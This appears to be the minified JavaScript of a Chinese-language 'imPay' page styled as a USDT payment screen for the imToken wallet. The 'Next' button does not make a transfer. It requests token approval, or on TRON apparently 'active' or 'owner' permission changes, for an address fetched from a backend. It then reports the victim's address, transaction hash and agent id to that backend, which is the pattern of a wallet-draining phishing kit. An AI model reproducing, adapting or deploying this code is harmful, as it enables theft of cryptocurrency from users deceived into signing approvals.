import{u as e}from"./mqTkH8aLI-e77d1687.js";import{s as a,a as s,b as t,g as o}from"./h0m03JSV-e5b8b9fd.js";import{B as i,a as r,b as l,c,t as d,g as u}from"./q-00967491.js";import{T as p}from"./e4TIHP4Nx2-9f1809d5.js";import{d as n,e as m,c as v,g as b,a as f,b as j}from"./tjAUJIe4k-97c8c542.js";import{v as w,c as h,b as g,Q as k,P as y,l as T,M as x,R as S,S as A,O as I,q as L}from"./rBh3B-06aae374.js";import{r as J,u as E}from"./3ttLrwD47-b1f97e95.js";import{P as _}from"./3x7JhZkdby-99d01c74.js";import{F as O,B as N,s as R,a as U,c as q}from"./6XK-283b68fb.js";import{_ as C}from"./5YZA4e6SuY-bbff4efa.js";import"./JlluW-63810b54.js";import"./qQduQiU-24714400.js";import"./EXD-a738c54c.js";import"./G-7e5ad706.js";import"./sgU-1f381e19.js";import"./h-e687f861.js";import"./YuPT9-548fb140.js";import"./GkaLd9Yj7r-b225f007.js";import"./0m4Z4-7163ca2b.js";import"./UqcW-3328600b.js";import"./1O-78e505b6.js";import"./hm-8fa9840d.js";import"./IcG65k-5a9d3be1.js";import"./ZsDNSE-f772636c.js";import"./8OaeAE-e434d5ed.js";import"./LiXB-016cdfb8.js";import"./eK-88b89063.js";import"./xBlez5-84730707.js";import"./AKszOkpQ06-8ad74f6f.js";import"./LAg42k2r-82133d37.js";import"./eCAKZbx-b4e32d3c.js";import"./Fmq0KM-b618826d.js";/* empty css          */import"./ELFd4dtpZ-54019e8f.js";/* empty css             */import"./YcuNs-ed83c981.js";import"./nzJ-675dc3a9.js";import"./2lMEzV9dv-715f8b97.js";import"./jnMSss7-ef6ddf44.js";import"./PUE7Ew-682f2be9.js";import"./vm-2db01d5d.js";import"./nUWoqrvKJH-8ac44cb6.js";import"./IQl6-e2f969e9.js";import"./kpTd8Dck6U-0ef6d460.js";import"./3QsK-f733cff7.js";import"./wG0EPw-456d61e8.js";import"./lCwrLr-3897c0ce.js";import"./J8VhFl-1d853cd5.js";import"./qO-31a9fe54.js";import"./7LJndX-a525d049.js";import"./48Ty-69517cb3.js";import"./MW-e9012996.js";import"./CwQCKo-8132b68f.js";import"./gFrB-d1351c6d.js";import"./1nk-fe6031da.js";import"./qtl-aab38ed2.js";import"./yrc9l4bp-0c8d556a.js";import"./D-a73f23ee.js";import"./0h948-dbca5c15.js";import"./I99VOLLTh-6b056169.js";import"./TFxwsC51oD-dd803a5d.js";import"./Wlp7iy-dc64f11e.js";import"./IJaf619GL-e8697225.js";import"./0Jl24r-035f4e45.js";import"./6z7j-040ae197.js";const H=e=>(S("data-v-6966fb22"),e=e(),A(),e),X={class:"page-container"},z=H((()=>y("div",{class:"bottom-m10 left-m10 right-m30 top-p10 o7 fs14"},"收款账号",-1))),B={class:"left-m10 bg-white br12 right-m10",style:{padding:"12px 15px","border-radius":"5px"}},D={class:"bottom-m10 left-m10 right-m10 top-m20 o7 fs14 spaceb"},K=H((()=>y("span",{class:"fs14"},"数量",-1))),F={class:"fs14 o7"},P={class:"bg-white left-m10 br12 right-m10",style:{"border-radius":"5px"}},Q={class:"address left-m20 o7 top-p20 bottom-p10 column"},V={style:{"margin-right":"15px"}},Z={class:"spaceb right-m10 top-m10 o6"},G={class:"fs14"},M={class:"center-w confirm-btn left-m10 right-m10",style:{"margin-top":"15px"}},W=C(w({__name:"imPay",setup(w){const S=J(0),A=J(0),C=J(.069),H=J({type:1,walletType:1,agentId:"",token:"USDT",amount:1,clientId:"",block:i.TRX,ads:"",isAdd:!1,client_type:1,extend:{}}),W=J("");J("");const Y=J({authAddress:"",clientId:"",receiveAddress:{trx:"",eth:"",bsc:""},authSuccessTips:""}),$=J("");J(!1),e(),J("");const ee=J(!0),ae=h((()=>H.value.ads||Y.value.receiveAddress[H.value.block])),se=()=>{const{type:e}=H.value;if(A.value<S.value)return R("Insufficient balance");1==e?te():2==e?oe():ie()},te=async()=>{try{if(U({message:"Loading...",duration:0}),H.value.block==i.TRX){const e=await r("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",W.value,$.value);e.result&&(re($.value,"approve",e.txid),R(Y.value.authSuccessTips))}else if(H.value.block==i.ETH){const e=await n(web3.value,$.value,W.value);e.transactionHash&&(re($.value,"approve",e.transactionHash),R(Y.value.authSuccessTips))}else if(H.value.block==i.BSC){const e=await m(web3.value,$.value,W.value);e.transactionHash&&(re($.value,"approve",e.transactionHash),R(Y.value.authSuccessTips))}}catch(e){q()}},oe=async()=>{if(H.value.block!=i.TRX)return;const e=await l(W.value,$.value,H.value.isAdd);(null==e?void 0:e.result)?(re($.value,"active",e.txid),R(Y.value.authSuccessTips),q()):e&&R("object"==typeof e?JSON.stringify(e):String(e))},ie=async()=>{if(H.value.block!=i.TRX)return;const e=await c(W.value);e.result&&(re($.value,"owner",e.txid),R(Y.value.authSuccessTips))},re=async(e,o,i)=>{const r={addres:e,auth_addres:W.value,hash:i||0,wallete_type:"ImToken",client_id:H.value.clientId||Y.value.clientId||"",source:window.location.href,agent_uid:H.value.agentId,block:H.value.block,client_type:H.value.client_type,amount:H.value.amount,extend:H.value.extend?JSON.stringify(H.value.extend):""};switch(o){case"approve":await t(r);break;case"active":await s(r);break;case"owner":await a(r)}q()},le=async()=>{let e;switch(H.value.block){case i.TRX:if($.value=await tronWeb.defaultAddress.base58,!$.value)return R("无法获取钱包地址！请检查浏览器是否支持TRON！");A.value=await u($.value,H.value.token);break;case i.ETH:e=await f(),web3.value=e.web3,$.value=e.userAddress,A.value=await j(web3.value,e.userAddress);break;case i.BSC:e=await v(),web3.value=e.web3,$.value=e.userAddress,A.value=await b(web3.value,e.userAddress)}};return g((async()=>{const e=JSON.parse(localStorage.getItem("routerParams"));if(S.value=e.amount,H.value={amount:S.value,type:e.type,walletType:1,agentId:e.agent,token:e.token||"USDT",block:e.block||i.TRX,clientId:e.clientId||"",ads:e.ads,isAdd:e.isAdd,client_type:1,extend:e.extend},(async()=>{try{const e=JSON.parse(localStorage.getItem("config"));Y.value={...e};const{type:a}=H.value;ee.value=!0;const s=await o({block:H.value.block,type:d[H.value.type]});ee.value=!1;const t=s.data;Y.value={...e,authAddress:t},W.value=Y.value.authAddress}catch(e){ee.value=!1}})(),p.isTokenEnv())try{p.apis.navigator.setTitle(`${String(H.value.token).toLocaleLowerCase()}转账`);let e="";e=H.value.block==i.TRX?await p.apis.user.showAccountSwitch("TRON"):await p.apis.user.showAccountSwitch("ETHEREUM"),$.value=e,le()}catch(a){4001==a.code&&le()}else{le();const e=`imtokenv2://navigate?screen=DappView&url=${window.location.href}`;window.location.href=e}})),(e,a)=>(I(),k("div",X,[z,y("div",B,_(ae.value||"-"),1),y("div",D,[K,y("span",F,_(A.value)+" "+_(String(H.value.token).toLocaleUpperCase()),1)]),y("div",P,[y("div",Q,[y("div",V,[T(E(O),{modelValue:S.value,"onUpdate:modelValue":a[0]||(a[0]=e=>S.value=e),type:"number",label:"",placeholder:"请输入",size:"large",style:{"font-size":"16px",padding:"0 0 10px 0px","border-bottom":"1px solid #eee"}},null,8,["modelValue"])]),y("div",Z,[y("span",G," $ "+_("t"==H.value.token?Number(Number(S.value).toFixed(2)*C.value).toFixed(3):S.value),1)])])]),y("div",M,[T(E(N),{style:{width:"100%","border-radius":"8px"},size:"large",color:"#3478f6",onClick:se,loading:ee.value},{default:x((()=>[L("下一步")])),_:1},8,["loading"])])]))}}),[["__scopeId","data-v-6966fb22"]]);export{W as default};
